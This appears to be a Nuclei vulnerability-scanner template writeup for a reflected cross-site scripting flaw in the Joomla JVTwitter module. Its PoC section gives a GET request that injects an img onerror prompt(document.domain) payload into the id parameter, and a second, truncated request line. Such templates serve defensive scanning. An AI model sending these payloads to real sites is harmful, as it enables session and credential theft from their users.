# Nuclei Template: Joomla JVTwitter - Cross-Site Scripting
**Template ID:** joomla-jvtwitter-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**CWE:** CWE-79
**Source:** Nuclei Template (`joomla-jvtwitter-xss.yaml`)

## Vulnerability Information & PoC

## Description
The attacker can send to victim a link containing a malicious URL in an email or instant message can perform a wide variety of actions, such as stealing the victim's session token or login credentials.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/modules/mod_jvtwitter/jvtwitter.php?id=%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain);%3E
GET {{BaseURL}}/modules/mod_jvtwitter/jvtwitter.php?id=
```

## References
- https://buaq.net/go-44433.html
- https://cxsecurity.com/issue/WLB-2020110041
- https://extensions.joomla.org/
